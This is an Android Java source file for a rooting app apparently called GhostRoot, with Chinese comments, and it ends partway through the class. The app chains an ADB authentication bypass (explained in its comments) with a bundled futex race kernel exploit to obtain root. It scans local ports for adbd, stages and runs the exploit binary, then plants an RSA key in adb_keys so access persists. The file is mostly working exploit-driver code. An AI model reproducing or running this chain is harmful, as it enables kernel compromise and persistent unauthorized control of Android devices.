package com.fuxi.ghostroot;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.system.Os;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.content.Context;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class MainActivity extends Activity {

    private static final String[] KSU_PKGS = {
        "me.weishu.kernelsu",
        "com.resukisu.resukisu",
        "com.sukisu.ultra"
    };

    /** Shizuku 授权请求码。 */
    private static final int SHIZUKU_REQ = 4001;

    /** 运行模式：目前只有「完整提权」一条链。 */
    private static final int MODE_ROOT = 1;
    private int mode = MODE_ROOT;

    /** Path (inside the shell domain) where ksud was staged, e.g. /data/local/tmp/ksud. */
    private String ksudPath;

    private TextView output;
    private TextView status;
    private ScrollView scroll;
    private Button runBtn;
    private final StringBuilder fullLog = new StringBuilder();
    private final Handler ui = new Handler(Looper.getMainLooper());
    private final ExecutorService pool = Executors.newSingleThreadExecutor();
    private volatile boolean running = false;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.main);
        // 在布局最顶部插入【独立终端】入口（纯代码，避免改资源/R.java）
        //
        // 入口设计（v27 精简）：
        //   主按钮 = 布局里原有的 runBtn（"一键提权"），走完整链路 0073 → 8550。
        //   顶部额外按钮 = 【独立终端】，通道自选（Shizuku / 0073），用于
        //                 单独验证通道、跑任意命令，不碰 8550。
        //
        // 已删除的历史入口：
        //   「仅获取 Shell 域」—— 拿到的 Shell 只在方法作用域内有效、无法跨 Activity
        //   交给终端页，而终端页会自己重新建通道；既不产出、也没交接对象，纯多余。
        //   「获取 Root」 独立按钮 —— 与主按钮完全同一条链，重复。
        try {
            android.widget.LinearLayout root =
                    (android.widget.LinearLayout) findViewById(R.id.run).getParent();

            Button termBtn = new Button(this);
            termBtn.setText("独立 Shell 终端（通道自选 · 安全）");
            termBtn.setTextSize(14);
            termBtn.setLayoutParams(new android.widget.LinearLayout.LayoutParams(
                    android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
                    android.widget.LinearLayout.LayoutParams.WRAP_CONTENT));
            termBtn.setOnClickListener(new View.OnClickListener() {
                @Override public void onClick(View v) {
                    try {
                        startActivity(new android.content.Intent(
                                MainActivity.this, ShellTerminalActivity.class));
                    } catch (Throwable t) {
                        Toast.makeText(MainActivity.this, "打开终端失败: " + t, Toast.LENGTH_LONG).show();
                    }
                }
            });

            // 插到主按钮【之前】——即标题栏下面，而不是索引 0（那会盖在标题之上）
            int runIdx = root.indexOfChild(findViewById(R.id.run));
            root.addView(termBtn, runIdx < 0 ? 0 : runIdx);
        } catch (Throwable ignored) {}
        output = (TextView) findViewById(R.id.output);
        scroll = (ScrollView) findViewById(R.id.scroll);
        runBtn = (Button) findViewById(R.id.run);
        try { status = (TextView) findViewById(R.id.status); } catch (Throwable ignored) {}
        runBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { start(); }
        });
        // 注：v29 起**彻底删除**了「复制日志」与「保存到 /sdcard」按钮。
        //     日志区 output 自带 textIsSelectable=true，长按即可选中/复制；
        //     需要留存时可长按全选后粘贴到任意地方，比多两个按钮更省界面。
        log("GhostRoot | " + Build.MODEL);
        log("");
        log("使用步骤：");
        log("  1) 打开【开发者选项】→【无线调试】（会自动关闭，开了马上点本按钮）");
        log("  2) 点上方【一键提权】，自动扫端口并跑完 0073 + 8550 全流程");
        log("  3) 只想验证通道 / 跑命令 → 点【独立 Shell 终端】，不会跑 8550");
        log("");
        log("注意：执行期间不要退出软件；若 30 秒内未完成，基本即失败，重启后重试。");
        log("");
    }

    @Override
    protected void onDestroy() {
        pool.shutdownNow();
        super.onDestroy();
    }

    private void log(final String s) {
        ui.post(new Runnable() {
            @Override public void run() {
                fullLog.append(s).append("\n");
                output.append(s + "\n");
                scroll.post(new Runnable() {
                    @Override public void run() { scroll.fullScroll(View.FOCUS_DOWN); }
                });
            }
        });
    }

    private void setRunning(final boolean r) {
        running = r;
        ui.post(new Runnable() {
            @Override public void run() {
                runBtn.setEnabled(!r);
                runBtn.setText(r ? "执行中..." : "一键提权");
            }
        });
        setStatus(r ? "执行中…（请勿锁屏 / 保持前台）" : "就绪。请确保已开启「无线调试」。",
                r ? C_RUNNING : C_IDLE);
    }

    private void start() { startMode(mode); }

    /** 启动完整提权链路。 */
    private void startMode(final int m) {
        if (running) return;
        this.mode = m;
        setRunning(true);
        output.setText("");
        fullLog.setLength(0);
        pool.execute(new Runnable() {
            @Override public void run() {
                boolean ok = false;
                try {
                    ok = doWork();
                }
                catch (Throwable t) { log("[!] 异常: " + t); }
                finally {
                    setRunning(false);
                    // 状态行：成功 / 失败（失败的具体原因早写在日志里了）
                    if (ok) setStatus("✅ 完成 —— 结果见本次运行日志", C_OK);
                    else    setStatus("❌ 未完成 —— 报告可能是判断逻辑没写好，重启后重试", C_FAIL);
                    // 日志同时静默落盘（无按钮，用户需要时可用文件管理器取）
                    saveLogToFile();
                }
            }
        });
    }

    /* ============================ core work ============================ */

    private File nativeBin(String name) {
        return new File(getApplicationInfo().nativeLibraryDir, name);
    }

    /**
     * 完整提权链路。
     *
     * @return true = 走到了最后（8550 执行完毕且未命中已知失败特征）；false = 中途中止。
     */
    private boolean doWork() throws Exception {
        File ghost = nativeBin("libghostroot.so");
        File f8550 = nativeBin("libfuxi8550.so");
        log("[*] ghostroot : " + ghost + " exists=" + ghost.exists() + " len=" + ghost.length());
        log("[*] fuxi8550  : " + f8550 + " exists=" + f8550.exists() + " len=" + f8550.length());
        if (!ghost.exists() || !f8550.exists()) {
            log("[!] 内置二进制方缺失，APK 打包异常");
            return false;
        }

        // ============ 阶段 A：获取 shell 域（主路 0073 → 兜底 Shizuku） ============
        Shell shell = null;

        // A0) 前置检查：#0 adb_keys 隐形前提（仅在能读到时提示，读不到不阻断）
        log("[*] 前置检查：/data/misc/adb/adb_keys ...");
        checkAdbKeysPrecheck();

        // A1) 主路：0073
        log("[*] 扫描无线调试端口 127.0.0.1:30000-65535 ...");
        int port = scanPort(30000, 65535);
        if (port < 0) {
            log("[!] 未扫到无线调试端口。请开启【无线调试】后立即重试。");
        } else {
            log("[+] 端口 = " + port);
            log("[*] [主路] 通过 CVE-2026-0073 获取 shell ...");
            Adb0073Shell s73 = new Adb0073Shell("127.0.0.1", port);
            String probe = s73.exec("id");
            log(s73.log());
            log(probe == null ? "(null)" : probe);
            if (probe != null && (probe.indexOf("uid=2000") >= 0 || probe.indexOf("uid=0") >= 0)) {
                log("[+] [主路] shell 域已获取");
                shell = s73;
            } else {
                log("[!] [主路] 0073 未取得 shell 域");
                s73.close();
            }
        }

        // A2) 兜底：Shizuku（由用户选择）
        if (shell == null) {
            shell = tryShizukuFallback();
        }

        if (shell == null) {
            log("[!] 0073 与 Shizuku 均未取得 shell 域，中止");
            return false;
        }
        log("[+] 当前通道: " + shell.name());

        // ============ 阶段 B：与通道无关的提权流程 ============

        // 2b) 内核版本自动选择：拿 shell 之后读，回显给用户
        log("[*] 探测内核版本 ...");
        String kver = shell.exec("uname -r");
        kver = (kver == null) ? "" : kver.trim();
        // 只取第一行（避免混入 adb 日志/多行输出）
        int nl = kver.indexOf('\n');
        if (nl >= 0) kver = kver.substring(0, nl).trim();
        log("[*] 内核: " + (kver.isEmpty() ? "(读取失败)" : kver));
        String target = kernelTarget(kver);
        if (target == null) {
            log("[!] 未识别的内核版本 [" + kver + "]，本工具仅支持 5.15.178 / 5.15.194");
            log("[!] 已中止，避免 8550 回落到默认 profile 写坏内核");
            return false;
        }
        log("[+] 检测到内核版本 " + kver + " → 使用 " + target + " profile");

        // 4a) push 8550 into shell-readable space
        log("[*] 推送 8550 到 /data/local/tmp ...");
        String remote8550 = "/data/local/tmp/fuxi8550";
        byte[] data8550 = readAllBytes(f8550);
        log("[*] 8550 size=" + data8550.length);
        boolean ok850 = shell.push(data8550, remote8550);
        log(shell.log());
        String chk850 = shell.exec(
                "ls -l " + remote8550 + "; echo SZ$(stat -c %s " + remote8550 + ")");
        log(chk850 == null ? "(null)" : chk850);
        if (!ok850 || chk850 == null || chk850.indexOf("SZ" + data8550.length) < 0) {
            log("[!] 8550 大小校验不符，中止");
            return false;
        }
        log("[+] 8550 已就位");

        // 3b) locate ksud -- done entirely inside the shell domain
        log("[*] 定位 ksud ...");
        File ksud = extractKsud(getFilesDir(), shell);
        if (ksud == null) {
            log("[!] no ksud found; stopping before late-load");
            return false;
        }
        String remoteKsud = ksudPath != null ? ksudPath : "/data/local/tmp/ksud";
        String chkKs = shell.exec(
                "ls -l " + remoteKsud + "; echo SZSIZE; stat -c %s " + remoteKsud);
        log(chkKs == null ? "(null)" : chkKs);
        if (chkKs == null || chkKs.indexOf(remoteKsud) < 0) {
            log("[!] ksud 未就位，中止");
            return false;
        }
        log("[+] ksud 已就位: " + remoteKsud);

        // 4c) run the exploit: fuxi8550 --root-command '<ksud> late-load' --target <自动探测>
        log("[*] 执行提权（可能因竞态卡死，请保持屏常亮）...");
        String post = remote8550 + " --root-command '" + remoteKsud
                + " late-load' --target " + target + " 2>&1";
        String res = shell.exec(post);
        log(res == null ? "(null)" : res);
        log("");

        // ============ 阶段 C：结果判定 ============
        // 8550 在 futex PI 竞态里如果没能一次性把 one-shot PI 状态"消费"掉，
        // 内核里会残留一个活着的 PI 状态，此时**再跑一次只会更糟**，
        // 必须重启（清掉残留状态）后重试。
        if (isOneShotStateAlive(res)) {
            log("");
            log("========================================");
            log("[✗] 提权失败：内核残留 one-shot PI 状态");
            log("[!] 请【重启手机】后再试，直接重试必定再次失败。");
            log("========================================");
            return false;
        }
        if (isCredVerifyFailed(res)) {
            log("");
            log("========================================");
            log("[✗] 提权失败：atomic credential transaction 校验未通过");
            log("[!] 建议【重启手机】后再试。");
            log("========================================");
            return false;
        }
        // ============ 阶段 D：成功收尾（#10）============
        // 只有确认「root 真的拿到了」才做收尾；没成功就别乱动 adb_keys。
        if (isRootSuccess(res)) {
            log("");
            log("========================================");
            log("[+] 提权成功：已获得 root 权限（UID/GID 0）");
            log("[*] 执行成功后收尾 ...");
            log("========================================");
            cleanupStaging(shell, remote8550, remoteKsud);
            persistAdbKey(shell);
            log("[+] 收尾完成。");
        } else {
            log("");
            log("[!] 未检测到明确的 root 成功标志，跳过收尾（不清理、不写 adb_keys）。");
        }
        log("==== 完成（结果见上）====");

        shell.close();
        return true;
    }

    /* ======================= 阶段 D：成功收尾（#10） ======================= */

    /**
     * 判定 8550 是否真的拿到了 root。
     *
     * 8550 成功时会打印（取自 libfuxi8550.so 的 strings）：
     *   {@code [+] ROOT SUCCESS: UID/GID 0 with full capabilities; pid=...}
     *   {@code [+] su daemon activated, socket=...}
     *   {@code [+] SU DAEMON READY: ...}
     *
     * 只要命中 `ROOT SUCCESS` 即认为提权成功（最权威的一条）。
     */
    private boolean isRootSuccess(String out) {
        if (out == null) return false;
        String s = out.toLowerCase();
        return s.indexOf("root success") >= 0
                || s.indexOf("uid/gid 0 with full capabilities") >= 0;
    }

    /**
     * #10-D1：清理 /data/local/tmp 里本次运行落地的文件。
     *
     * 只删我们明确知道路径的几个（8550 与 ksud），**不做通配符删除**，
     * 以免误伤用户自己放在 /data/local/tmp 的东西。
     */
    private void cleanupStaging(Shell shell, String remote8550, String remoteKsud) {
        try {
            log("[*] D1) 清理 /data/local/tmp ...");
            String cmd = "rm -f " + remote8550 + " 2>&1; "
                    + "rm -f " + remoteKsud + " 2>&1; "
                    + "rm -f " + remoteKsud + ".log 2>&1; "
                    + "echo '--- remain(应为空) ---'; "
                    + "ls -l " + remote8550 + " 2>&1; "
                    + "ls -l " + remoteKsud + " 2>&1";
            String r = shell.exec(cmd);
            log(r == null ? "(null)" : r);
            log("[+] D1) 清理完成（显示 No such file 即为已删除）");
        } catch (Throwable t) {
            log("[!] D1) 清理异常: " + t);
        }
    }

    /**
     * #10-D2：把 RSA 公钥固化进 /data/misc/adb/adb_keys。
     *
     * 背景（#0 的延伸）：
     *   CVE-2026-0073 能触发的前提是 adb_keys 里存在至少一把 RSA 公钥；
     *   而 0073 走的是「自己造的 RSA 公钥去骗过 EVP_PKEY_cmp」。
     *   既然此刻已经是 root，就把这把公钥**真正写进 adb_keys**，
     *   于是下次 adbd 起来会直接认它 —— 不必再重新走一遍认证绕过。
     *
     * 实现：
     *   ① 先看 adb_keys 现状（可能已有内容，绝不能覆盖丢钥匙）；
     *   ② 从常见位置找本机现成的 RSA 公钥（如 /data/misc/adb/adbkey.pub
     *      或 App 自己生成/暂存的）；找不到就跳过并提示；
     *   ③ 追加（不覆盖）到 adb_keys，并修正权限/SELinux 上下文。
     */
    private void persistAdbKey(Shell shell) {
        try {
            log("[*] D2) 固化 RSA 公钥到 /data/misc/adb/adb_keys ...");

            // ① 现状
            String cur = shell.exec(
                    "ls -lZ /data/misc/adb/adb_keys 2>&1; "
                    + "echo '--- lines ---'; wc -l /data/misc/adb/adb_keys 2>&1");
            log(cur == null ? "(null)" : cur);

            // ② 找一个可用的 RSA 公钥来源
            String findKey =
                    "for p in /data/misc/adb/adbkey.pub "
                    + "/data/local/tmp/adbkey.pub "
                    + "/data/system/users/0/adb_keys; do "
                    + "  if [ -f $p ]; then echo FOUND:$p; head -c 64 $p; echo; fi; "
                    + "done";
            String found = shell.exec(findKey);
            log("[*] 公钥候选: " + (found == null ? "(null)" : found.trim()));

            if (found == null || found.indexOf("FOUND:") < 0) {
                log("[!] 未找到可用的 RSA 公钥来源，跳过 adb_keys 固化。");
                log("    提示：可在电脑上执行 adb keygen，或用 Shizuku 激活生成后再试。");
                return;
            }

            // ③ 追加而非覆盖
            String src = found.substring(found.indexOf("FOUND:") + 6);
            src = src.substring(0, src.indexOf('\n') > 0 ? src.indexOf('\n') : src.length()).trim();
            String add =
                    "grep -qF \"$(cat " + src + ")\" /data/misc/adb/adb_keys 2>/dev/null "
                    + "|| cat " + src + " >> /data/misc/adb/adb_keys; "
                    + "chmod 640 /data/misc/adb/adb_keys 2>&1; "
                    + "chown system:shell /data/misc/adb/adb_keys 2>&1; "
                    + "restorecon /data/misc/adb/adb_keys 2>&1; "
                    + "echo '--- after ---'; ls -lZ /data/misc/adb/adb_keys 2>&1; "
                    + "wc -l /data/misc/adb/adb_keys 2>&1";
            String r = shell.exec(add);
            log(r == null ? "(null)" : r);
            log("[+] D2) adb_keys 固化尝试完成（已做去重，不会重复写入）");
        } catch (Throwable t) {
            log("[!] D2) adb_keys 固化异常: " + t);
        }
    }

    /**
     * 失败特征 1：内核残留 one-shot PI 状态。
     *
     * 8550 输出：{@code [-] root chain stopped with one-shot PI state alive; reboot before retrying}
     *
     * 含义：futex PI 竞态本轮没能"消费"掉那个一次性状态，内核里还留着一个活着的
     * PI 持有者。这个状态下**直接重试不会成功**（状态不是干净的），
     * 而且反复跑会加重内核负担 → 必须重启后重试。
     */
    private boolean isOneShotStateAlive(String out) {
        if (out == null) return false;
        String s = out.toLowerCase();
        return s.indexOf("one-shot pi state alive") >= 0
                || s.indexOf("reboot before retrying") >= 0;
    }

    /**
     * 失败特征 2：atomic credential transaction 校验失败。
     *
     * 8550 输出：{@code [-] atomic credential transaction verification failed}
     *
     * 含义：篡改后的 cred 结构在 atomic_cred 提交校验时被内核识破（竞态窗口没抢准）。
     * 稳妥做法同样是重启后再试，避免带着半改的 cred 继续跑。
     */
    private boolean isCredVerifyFailed(String out) {
        if (out == null) return false;
        String s = out.toLowerCase();
        return s.indexOf("atomic credential transaction verification failed") >= 0;
    }

    /**
     * 0073 失败后的兜底：Shizuku 通道。
     *
     * 流程：bootstrap 拿 binder → 看服务在不在 → 看有没有授权 →
     *      弹窗让【用户自己选】→ 选了就 verify 并返回。
     */
    private Shell tryShizukuFallback() {
        log("");
        log("[*] [兜底] 尝试 Shizuku 通道 ...");

        // 1) 手动绑定 Shizuku binder（替代 ShizukuProvider）
        boolean boot = ShizukuAdapter.bootstrap(this);
        log("[*] shizuku bootstrap = " + boot);
        if (!boot || !ShizukuAdapter.isBinderAlive()) {
            log("[!] [兜底] 未检测到运行中的 Shizuku");
            log("[*]       如需使用兜底通道：安装并启动 Shizuku（ADB 模式）后重试");
            return null;
        }
        log("[*] shizuku 状态: " + ShizukuAdapter.describe());

        // 2) 授权检查
        if (!ShizukuAdapter.isGranted()) {
            log("[!] [兜底] GhostRoot 尚未获得 Shizuku 授权");
            log("[*]       请在弹窗中允许授权后重试");
            askShizukuPermission();
            return null;
        }

        // 3) 弹窗：让用户自己选
        final boolean[] useIt = { false };
        final java.util.concurrent.CountDownLatch latch =
                new java.util.concurrent.CountDownLatch(1);
        ui.post(new Runnable() {
            @Override public void run() {
                try {
                    new AlertDialog.Builder(MainActivity.this)
                        .setTitle("0073 通道未打通")
                        .setMessage("检测到 Shizuku 可用（uid=2000，与 0073 等价的 shell 域）。\n\n"
                                + "是否改用 Shizuku 通道继续提权？")
                        .setPositiveButton("用 Shizuku", new DialogInterface.OnClickListener() {
                            @Override public void onClick(DialogInterface d, int w) {
                                useIt[0] = true; latch.countDown();
                            }
                        })
                        .setNegativeButton("中止", new DialogInterface.OnClickListener() {
                            @Override public void onClick(DialogInterface d, int w) {
                                useIt[0] = false; latch.countDown();
                            }
                        })
                        .setCancelable(false)
                        .show();
                } catch (Throwable t) {
                    latch.countDown();
                }
            }
        });
        try { latch.await(); } catch (Throwable ignored) {}
        if (!useIt[0]) {
            log("[*] 用户选择中止");
            return null;
        }

        // 4) 用户选了 → 验证并返回
        log("[*] [兜底] 用户选择使用 Shizuku，正在验证 shell 域 ...");
        ShizukuShell ss = new ShizukuShell(this);
        String id = ss.exec("id");
        log(id == null ? "(null)" : id);
        if (!ss.verify()) {
            log("[!] [兜底] Shizuku 通道未取得 shell 域");
            return null;
        }
        log("[+] [兜底] shell 域已获取（Shizuku / " + ShizukuAdapter.selinuxContext() + "）");
        return ss;
    }

    /** 请求 Shizuku 授权（结果会弹 Shizuku 自己的授权窗）。 */
    private void askShizukuPermission() {
        try {
            ui.post(new Runnable() {
                @Override public void run() {
                    try { ShizukuAdapter.requestPermission(SHIZUKU_REQ); }
                    catch (Throwable ignored) {}
                }
            });
        } catch (Throwable ignored) {}
    }

    /** Return the app-private path of libksud.so (or a local copy) for pushing. */
    /**
     * Locate libksud.so from whatever KernelSU / ReSukiSU / SukiSU variant is
     * installed, copy it into our private dir and return that copy.
     *
     * Strategy: try the well-known package names first, then fall back to
     * walking EVERY installed package looking for a libksud.so.  Manager app
     * package names differ wildly between forks, so a hardcoded list is not
     * reliable.
     */
    /**
     * Locate the ksud binary that the 8550 late-load path should execute.
     *
     * Everything here goes through the *shell* domain (uid=2000), NOT through
     * PackageManager: our app targets SDK 34, so Android package-visibility
     * filters getInstalledApplications() down to just ourselves -- which is
     * exactly the "1 packages" we saw.  `pm list packages` run as shell has no
     * such restriction.
     *
     * 唯一可行路径：从 **KernelSU / ReSukiSU / SukiSU 管理器 APK 的
     * lib/arm64/libksud.so** 取一份。
     *
     * v28 起**删除**了原先的 direct 探测（`/data/adb/ksu/ksud` 与
     * `/data/adb/ksud`）：`/data/adb` 目录是 `root:root 0700`，**普通 App 域读不到**；
     * 即使走 shell 域（uid=2000）去 ls 也一律 `Permission denied`，
     * 那两步纯属浪费一次往返，永远不可能命中。
     */
    private File extractKsud(File dir, Shell sh) {
        log("[*] pm list packages | grep -iE 'kernelsu|sukisu|ksu' ...");
        String pkgs = sh.exec(
                "pm list packages 2>&1 | grep -iE 'kernelsu|sukisu|suki|ksu'");
        log("[*] matches: " + (pkgs == null ? "(null)" : pkgs.trim()));
        if (pkgs != null) {
            for (String line : pkgs.split("\\r?\\n")) {
                line = line.trim();
                if (line.startsWith("package:")) line = line.substring(8).trim();
                if (line.isEmpty()) continue;
                String pathOut = sh.exec("pm path " + line + " 2>&1");
                log("[*] pm path " + line + " -> " + (pathOut == null ? "(null)" : pathOut.trim()));
                if (pathOut == null) continue;
                for (String pl : pathOut.split("\\r?\\n")) {
                    pl = pl.trim();
                    if (!pl.startsWith("package:")) continue;
                    String apk = pl.substring(8).trim();
                    int slash = apk.lastIndexOf('/');
                    if (slash <= 0) continue;
                    String base = apk.substring(0, slash);
                    String lib = base + "/lib/arm64";
                    String probe = sh.exec(
                            "ls -l " + lib + "/libksud.so 2>&1; stat -c %s " + lib + "/libksud.so 2>&1");
                    log("[*] probe " + lib + "/libksud.so -> "
                            + (probe == null ? "(null)" : probe.trim()));
                    if (probe == null || probe.indexOf("No such file") >= 0) continue;
                    String dst = "/data/local/tmp/ksud";
                    String c = sh.exec(
                            "cp " + lib + "/libksud.so " + dst + " 2>&1; chmod 755 " + dst
                            + " 2>&1; ls -l " + dst + "; stat -c %s " + dst);
                    log("[*] copy -> " + dst + " : " + (c == null ? "(null)" : c.trim()));
                    if (c != null && c.indexOf(dst) >= 0) {
                        log("[+] ksud staged at " + dst + " (from " + line + ")");
                        ksudPath = dst;
                        return new File(dst);
                    }
                }
            }
        }

        log("[!] no ksud found; stopping before late-load");
        log("[*] diagnostic: ls /data/adb/");
        String d = sh.exec("ls -la /data/adb/ 2>&1");
        log(d == null ? "(null)" : d);
        return null;
    }

    /**
     * 从 uname -r 输出中提取剖面号（内核版本后三位），映射到 8550 的 --target 选择器。
     *
     *   5.15.178-android13-8-00021-g6f2f96be86b9-ab13729987  ->  "178"
     *   5.15.194-android13-8-00019-gf4321180a397-ab15212794  ->  "194"
     *
     * 为什么要显式传 --target：8550 自己也会匹配，但匹配不上时它会"静默回落到
     * OS3.0.303.0.WNKCNXM"的默认 profile（其自带告警：default addresses may
     * corrupt an incompatible kernel）。显式指定可彻底避免那个坑。
     *
     * @return "178" / "194"；无法识别时返回 null（调用方应中止，不要硬跑）
     */
    private static String kernelTarget(String kver) {
        if (kver == null) return null;
        // 形如 5.15.178-android13-...  ->  抓出第一段"数字.数字.数字"
        java.util.regex.Matcher m = java.util.regex.Pattern
                .compile("(\\d+)\\.(\\d+)\\.(\\d+)")
                .matcher(kver);
        if (!m.find()) return null;
        String major = m.group(1), minor = m.group(2), patch = m.group(3);
        // 只支持 5.15 系列
        if (!"5".equals(major) || !"15".equals(minor)) return null;
        if ("178".equals(patch)) return "178";
        if ("194".equals(patch)) return "194";
        return null;
    }

    /** Return the text after the first occurrence of key, or null. */
    private static String after(String s, String key) {
        int i = s.indexOf(key);
        if (i < 0) return null;
        i += key.length();
        int j = i;
        while (j < s.length() && s.charAt(j) != '\n' && s.charAt(j) != '\r') j++;
        return s.substring(i, j);
    }

    private void copyFile(File src, File dst) throws Exception {
        InputStream in = new FileInputStream(src);
        FileOutputStream fos = new FileOutputStream(dst, false);
        byte[] buf = new byte[32768];
        int n;
        while ((n = in.read(buf)) > 0) fos.write(buf, 0, n);
        fos.flush(); fos.close(); in.close();
    }

    private static byte[] readAllBytes(File f) throws Exception {
        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        InputStream in = new FileInputStream(f);
        byte[] buf = new byte[65536];
        int n;
        while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
        in.close();
        return bos.toByteArray();
    }

    /* ============================ #0 adb_keys 前置检查 ============================ */

    /**
     * #0 —— CVE-2026-0073 的**隐形前提**检查。
     *
     * 漏洞能否触发取决于 `/data/misc/adb/adb_keys` 里是否存在至少一把
     * **非 EC 类型**的公钥（通常是 RSA）。AOSP 的循环漏写 "== 1"：
     *
     *     for (auto& key : *authorized_keys) {
     *         if (EVP_PKEY_cmp(known_key, peer_key)) {  // -1（类型不同）也算真
     *             authorized = true; break;
     *         }
     *     }
     *
     *   - adb_keys 为空 / 读不到 → 一次都不进循环 → 认证失败
     *     → adbd 回 SSLV3_ALERT_CERTIFICATE_UNKNOWN
     *   - 有 RSA 公钥            → EVP_PKEY_cmp(RSA, EC) = -1 → truthy → "骗"过认证 ✅
     *   - 只有 EC / Ed25519      → 类型相同 = 0 → 失败
     *
     * **激活一次 Shizuku(ADB 模式) 就会把它的 RSA 公钥写进 adb_keys**，正好补齐条件。
     *
     * App 域读不了该文件内容（权限），所以这里：
     *   ① 先尝试用 java.io.File 直接读（某些 ROM / 早期版本可读）；
     *   ② 读不到就尝试 Shell 通道（若已有）；
     *   ③ 都拿不到内容时，至少用 File.length() 判断「是否为空文件」；
     *   ④ 结论只做**提示**，不阻断流程（因为真正结论由 0073 握手给出）。
     */
    private void checkAdbKeysPrecheck() {
        final String PATH = "/data/misc/adb/adb_keys";
        File f = new File(PATH);

        // ① 直接读
        try {
            if (f.exists() && f.canRead() && f.length() > 0) {
                String txt = new String(readAllBytes(f), "UTF-8");
                boolean rsa = txt.indexOf("AAAAB3NzaC1yc2E") >= 0;   // ssh-rsa base64 前缀
                boolean ec  = txt.indexOf("AAAAC3NzaC1lZDI1NTE5") >= 0  // ed25519
                           || txt.indexOf("AAAAE2VjZHNhLXNoYTIt") >= 0;  // ecdsa
                if (rsa) {
                    log("[+] adb_keys 含 RSA 公钥 → 0073 触发条件满足");
                } else if (ec) {
                    log("[!] adb_keys 只有 EC/Ed25519 公钥 → 0073 **无法触发**");
                    logAcbKeysGuide();
                } else {
                    log("[?] adb_keys 存在但未见已知公钥前缀（长度 " + f.length() + "）");
                }
                return;
            }
        } catch (Throwable ignored) {}

        // ② 读不到 → 只能看存在性/大小
        try {
            if (!f.exists()) {
                log("[?] 读不到 " + PATH + "（App 权限受限，属正常现象）");
                log("    若后续 0073 报 CERTIFICATE_UNKNOWN，按下面提示处理。");
            } else {
                long len = f.length();
                if (len == 0) {
                    log("[!] adb_keys **是空文件** → 0073 必然失败（CERTIFICATE_UNKNOWN）");
                    logAcbKeysGuide();
                } else {
                    log("[?] adb_keys 大小 " + len + " 字节（内容不可读，继续流程）");
                }
            }
        } catch (Throwable t) {
            log("[?] adb_keys 检查跳过: " + t);
        }
    }

    /** 统一的「如何补齐 adb_keys」人话引导（#0 + #1 共用）。 */
    private void logAcbKeysGuide() {
        log("[!] 解决办法（任选其一，然后重试）：");
        log("    1) 开发者选项 → 无线调试 → 使用配对码配对一次；");
        log("    2) 打开一次 Shizuku（ADB 模式）—— 它会把 RSA 公钥写进 adb_keys；");
        log("    3) 用 USB 执行一次 `adb devices`（若本机曾授权过该电脑）。");
    }

    /* ============================ port scan ============================ */

    private int scanPort(int lo, int hi) {
        final List<Integer> found = new ArrayList<Integer>();
        final int workers = 24;
        final int[] next = { lo };
        Thread[] ts = new Thread[workers];
        for (int i = 0; i < workers; i++) {
            ts[i] = new Thread(new Runnable() {
                @Override public void run() {
                    for (;;) {
                        int p;
                        synchronized (next) {
                            if (next[0] > hi) return;
                            p = next[0]++;
                        }
                        Socket s = new Socket();
                        try {
                            s.connect(new InetSocketAddress("127.0.0.1", p), 40);
                            synchronized (found) { found.add(p); }
                        } catch (Throwable ignored) {
                        } finally {
                            try { s.close(); } catch (Throwable ignored) {}
                        }
                    }
                }
            });
            ts[i].setDaemon(true);
            ts[i].start();
        }
        for (Thread t : ts) { try { t.join(); } catch (InterruptedException ignored) {} }
        // pick a port that speaks the ADB/STLS handshake
        for (Integer p : found) {
            if (speaksAdb(p)) return p;
        }
        return found.isEmpty() ? -1 : found.get(0);
    }

    /** Send a cleartext CNXN and check whether the reply is STLS/CNXN (i.e. adbd). */
    private boolean speaksAdb(int port) {
        Socket s = new Socket();
        try {
            s.connect(new InetSocketAddress("127.0.0.1", port), 400);
            s.setSoTimeout(700);
            s.getOutputStream().write(buildCnxn());
            s.getOutputStream().flush();
            byte[] hdr = new byte[24];
            int got = 0;
            while (got < 24) {
                int r = s.getInputStream().read(hdr, got, 24 - got);
                if (r <= 0) break;
                got += r;
            }
            if (got < 24) return false;
            int cmd = (hdr[0] & 0xff) | ((hdr[1] & 0xff) << 8) | ((hdr[2] & 0xff) << 16) | ((hdr[3] & 0xff) << 24);
            return cmd == 0x534c5453 /*STLS*/ || cmd == 0x4e584e43 /*CNXN*/;
        } catch (Throwable t) {
            return false;
        } finally {
            try { s.close(); } catch (Throwable ignored) {}
        }
    }

    private byte[] buildCnxn() {
        String banner = "host::features=shell_v2,cmd,stat_v2,delayed_ack";
        byte[] pay = banner.getBytes();
        int len = pay.length;
        int csum = 0; for (byte x : pay) csum += (x & 0xff);
        int magic = 0x4e584e43 ^ 0xFFFFFFFF;
        byte[] p = new byte[24 + len];
        put(p, 0, 0x4e584e43); put(p, 4, 0x01000001); put(p, 8, 256 * 1024);
        put(p, 12, len); put(p, 16, csum); put(p, 20, magic);
        System.arraycopy(pay, 0, p, 24, len);
        return p;
    }

    private static void put(byte[] b, int off, int v) {
        b[off]     = (byte) (v & 0xff);
        b[off + 1] = (byte) ((v >>> 8) & 0xff);
        b[off + 2] = (byte) ((v >>> 16) & 0xff);
        b[off + 3] = (byte) ((v >>> 24) & 0xff);
    }

    /* ============================ status / log export ============================ */

    /**
     * 更新顶部状态行（UI 优化 #8）。
     *
     * @param text  要显示的文案
     * @param color 颜色（ARGB）；传 0 表示用默认灰
     */
    private void setStatus(final String text, final int color) {
        ui.post(new Runnable() {
            @Override public void run() {
                if (status == null) return;
                status.setText(text);
                if (color != 0) status.setTextColor(color);
            }
        });
    }

    /** 状态色：就绪 / 进行中 / 成功 / 失败。 */
    private static final int C_IDLE    = 0xFF8B949E;
    private static final int C_RUNNING = 0xFFFFC107;
